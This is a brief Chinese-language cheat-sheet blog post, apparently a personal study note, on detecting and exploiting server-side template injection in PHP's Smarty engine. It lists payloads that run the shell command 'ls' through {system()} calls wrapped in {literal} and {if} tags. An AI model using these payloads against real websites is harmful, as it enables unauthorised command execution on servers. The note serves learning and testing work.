# PHP Smarty模版注入


### 判断
尝试{system(&#39;ls&#39;)}，看报错内容，一般会有提示

### 注入
使用标签
例
```
{literal}{system(&#39;ls&#39;)}{/literal}
{if}{system(&#39;ls&#39;)}{/if}
```

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/  

